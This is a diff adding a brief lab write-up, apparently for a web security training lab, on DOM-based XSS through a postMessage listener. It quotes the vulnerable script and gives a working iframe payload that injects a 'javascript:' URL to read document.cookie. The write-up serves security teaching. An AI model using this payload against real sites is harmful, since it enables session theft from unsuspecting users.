@@ -1,0 +1,18 @@
+DOM XSS using web messages and a JavaScript URL
+
+Inspecting the source page, we can see a script:
+
+<script>
+    window.addEventListener('message', function(e) {
+        var url = e.data;
+        if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
+            location.href = url;
+        }
+    }, false);
+</script>
+
+The script is waiting for data, and we can use the following payload:
+
+<iframe src="https://ac021f1c1f4d801d802569cf00f90094.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:alert(document.cookie)//http:','*')"> 
+
+The lab solutions explains in detail what the script does.
